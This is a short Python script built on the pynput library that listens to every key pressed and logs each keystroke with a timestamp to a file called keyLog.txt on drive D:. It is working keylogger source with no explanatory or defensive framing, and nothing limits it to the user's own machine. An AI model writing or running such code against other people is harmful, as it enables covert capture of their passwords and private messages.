import pynput
from pynput.keyboard import Key, Listener
import logging
log_dir = r"d:"
ldir = log_dir
logging.basicConfig(filename = (ldir + r"/keyLog.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')

def on_pres (key):
    logging.info(str(key))

with Listener (on_press = on_pres) as listener:
    listener.join()